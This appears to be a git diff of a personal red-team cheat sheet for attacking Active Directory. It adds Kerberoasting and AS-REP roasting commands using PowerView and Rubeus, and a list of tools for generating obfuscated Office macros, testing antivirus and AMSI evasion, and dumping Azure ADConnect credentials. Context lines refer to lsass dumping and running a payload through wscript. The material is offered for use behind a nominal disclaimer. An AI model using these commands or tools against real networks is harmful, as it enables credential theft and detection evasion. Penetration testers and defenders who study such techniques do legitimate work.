@@ -5,9 +5,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
 * **[ACLs/ACEs permissions](#acls-possible-abuse)**
-* **[Constrained Language Mode](#constrained-language-mode)**
-	* [CLM Enumeration](#clm-enumeration)
-	* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
+* **Enumeration**
+	* **[Domain Enumeration](#powerview-enumeration)
+		* [ASREP Roasting](#asrep-roasting)
+		* [Kerberoasting](#kerberoasting)
+	* **[Constrained Language Mode](#constrained-language-mode)**
+		* [CLM Enumeration](#clm-enumeration)
+		* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
 * **Delegation**
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
@@ -32,6 +36,20 @@ ACL/ACE | Permission | Abuse
 **GenericWrite** | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation), [Targeted Kerberoast](#targeted-kerberoast), [Force change user's password](#force-change-user-password)
 **WriteDACL** | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
 **Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)
+
+## Domain Enumeration
+### ASREP Roasting
+```
+Get-DomainUser -PreauthNotRequired
+```
+### Kerberoasting
+```
+# Powerview
+Get-DomainUser -SPN
+
+# Rubeus
+Rubeus.exe kerberoast /nowrap
+```
 
 ## Constrained Language Mode (CLM)
 ### CLM Enumeration
@@ -164,6 +182,10 @@ $filename='<file-path-to>\payload.bin'
 ```powershell
 wscript.exe .\realtest.vbs
 ```
+## Extra Red Teaming Tools (that i know of xD)
+[MacroPack](https://github.com/sevagas/macro_pack) - Generate obfuscated Office Macro
+[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
+[ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect
 
 ## File Transfer
 
